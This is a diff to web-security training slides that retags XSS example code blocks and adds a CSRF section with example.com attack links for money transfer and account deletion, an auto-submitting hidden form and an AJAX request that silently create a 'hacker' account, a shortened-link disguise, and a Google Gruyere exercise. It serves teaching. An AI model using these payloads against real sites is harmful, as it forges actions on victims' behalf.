@@ -288,14 +288,14 @@ Example:
 http://example.com/search=<script>alert("xss");</script>
 ```
 HTTP request:
-```
+```http
 GET /search=<script>alert("xss");</script> HTTP/1.1
 Host: example.com
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 ```
 HTTP response:
-```html
+```http
 HTTP/1.1 200 OK
 Content-Type: text/html
 Content-Length: 1270
@@ -324,7 +324,7 @@ Note: XSS payload is stored, potentially forever, in some form of database.
 Step 1: inject payload on http://example.com/addYourName.php
 
 <img src="postxss.png">
-```html
+```http
 POST /addYourName.php HTTP/1.1
 Host: example.com
 Content-Type: application/x-www-form-urlencoded
@@ -332,7 +332,7 @@ Content-Type: application/x-www-form-urlencoded
 fname=Kevin%3Cscript%3Ealert%28%22xss%22%29%3B%3C%2Fscript%3E&lname=
 ```
 Step 2: on http://example.com/ViewAllNames.php
-```html
+```http
 HTTP/1.1 200 OK
 Content-Type: text/html
 ...
@@ -435,7 +435,7 @@ Example:
 http://example.com/search#<script>alert("xss");</script>
 ```
 HTTP request:
-```
+```http
 GET /search HTTP/1.1
 Host: example.com
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0
@@ -446,7 +446,7 @@ Connection: close
 <img src="dom.png" width="100%">
 ---
 # DOM-based XSS example
-```html
+```http
 HTTP/1.1 200 OK
 Content-Type: text/html
 Content-Length: 1270
@@ -585,6 +585,101 @@ class: middle, center
 class: middle, center
 # CSRF
 Cross-Site Request Forgery
+---
+# CSRF
+"Performing action on behalf of a victim user"
+---
+# Change password
+<img src="changepassword.png" width="100%">
+---
+# Add rogue account
+<img src="addhacker.png" width="65%">
+---
+class: middle
+Transfer $5000 to account number 7777
+```
+http://example.com/transferMoney.aspx?toAccount=7777&amp;amount=5000
+```
+---
+class: middle
+Delete your account
+```
+http://example.com/deleteAccount.php?areyousure=yes
+```
+---
+# POST requests
+```html
+<form action="/addUser.php" method="post">
+  username:<br>
+  <input type="text" name="username">
+  password:<br>
+  <input type="text" name="password">
+  <input type="submit" value="Add user">
+</form> 
+```
+<img src="adduser.png" width="40%">
+---
+# POST requests
+Automatic form post
+```html
+<form action="http://example.com/addUser.php" method="POST">
+  <input type="hidden" name="username" value="hacker" />
+  <input type="hidden" name="password" value="haxhaxhax" />
+  <input type="submit" value="Submit request" />
+</form>
+<script>
+  document.forms[0].submit();
+</script>
+```
+---
+# POST requests
+Automatic AJAX POST request
+```html
+<script>
+	var xhr = new XMLHttpRequest();
+	xhr.open("POST", "http:\/\/example.com\/addUser.php", true);
+	xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,*\/*;q=0.8");
+	xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+	xhr.setRequestHeader("Content-Type", "application\/x-www-form-urlencoded");
+	xhr.withCredentials = true;
+
+	var body = "username=hacker&password=haxhaxhax";
+	var aBody = new Uint8Array(body.length);
+
+	for (var i = 0; i < aBody.length; i++) {
+	  aBody[i] = body.charCodeAt(i); 
+	}
+
+	xhr.send(new Blob([aBody]));
+</script>
+```
+---
+class: middle
+<img src="mallink.png" width="100%">
+---
+class: middle
+<img src="mallink2.png" width="100%">
+---
+class: middle
+<img src="csrfshort.png" width="100%">
+---
+class: middle
+```
+http://example.com/transferMoney.aspx?fromAccount=4444&amp;toAccount=7777&amp;amount=5000
+```
+<img src="downarrow.png" width="5%" style="box-shadow:none;">
+```
+http://goo.gl/ZnVP5n
+```
+```http
+HTTP/1.1 301 Moved Permanently
+Location: http://example.com/transferMoney.aspx?fromAccount=4444&toAccount=7777&amount=5000
+...
+```
+---
+# Exercise
+1. Start "Google Gruyere" - check readme.txt
+2. Find CSRF!
 ---
 class: middle, center
 # Questions?
